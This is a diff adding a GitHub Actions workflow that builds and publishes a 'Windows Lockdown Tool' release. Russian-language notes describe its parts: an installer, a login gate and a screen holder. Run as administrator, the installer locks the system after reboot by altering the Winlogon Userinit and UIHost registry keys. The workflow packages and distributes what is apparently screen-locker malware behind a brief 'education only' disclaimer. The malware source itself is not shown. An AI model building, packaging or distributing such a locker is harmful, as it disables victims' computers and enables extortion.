@@ -1,0 +1,81 @@
+name: Create Release
+
+on:
+  push:
+    tags:
+      - 'v*'
+
+jobs:
+  release:
+    runs-on: windows-latest
+    
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    
+    - name: Setup Rust
+      uses: actions-rs/toolchain@v1
+      with:
+        toolchain: stable
+        target: x86_64-pc-windows-msvc
+        override: true
+    
+    - name: Create video placeholder
+      run: New-Item -Path "video.mp4" -ItemType File -Force
+    
+    - name: Build
+      run: cargo build --release --target x86_64-pc-windows-msvc
+    
+    - name: Prepare package
+      run: |
+        mkdir release_package
+        copy target\x86_64-pc-windows-msvc\release\*.exe release_package\
+        @"
+        ============================================
+        WINDOWS LOCKDOWN TOOL - RELEASE ${{ github.ref_name }}
+        ============================================
+        
+        ВНИМАНИЕ! Данный инструмент предназначен ТОЛЬКО для:
+        - Тестирования безопасности
+        - Исследовательских целей
+        - Образовательных проектов
+        
+        Использование в незаконных целях строго запрещено.
+        
+        Файлы:
+        - deployer.exe     - установщик
+        - gate_keeper.exe  - шлюз входа
+        - screen_holder.exe - экранный захватчик
+        
+        Для запуска: запустите deployer.exe с правами администратора.
+        ============================================
+        "@ | Out-File -FilePath release_package\README.txt -Encoding ASCII
+        
+        Compress-Archive -Path release_package\* -DestinationPath lockdown_tool_${{ github.ref_name }}.zip
+    
+    - name: Create Release
+      uses: softprops/action-gh-release@v1
+      with:
+        files: lockdown_tool_${{ github.ref_name }}.zip
+        draft: false
+        prerelease: false
+        generate_release_notes: true
+        body: |
+          ## Windows Lockdown Tool - Release ${{ github.ref_name }}
+          
+          **Внимание! Только для образовательных и исследовательских целей.**
+          
+          ### Состав:
+          - deployer.exe - установщик
+          - gate_keeper.exe - шлюз входа  
+          - screen_holder.exe - экранный захватчик
+          
+          ### Установка:
+          1. Распаковать архив
+          2. Запустить deployer.exe от имени администратора
+          3. Система будет заблокирована после перезагрузки
+          
+          ### Восстановление:
+          Загрузиться с LiveUSB и восстановить реестр:
+          - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+          - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UIHost
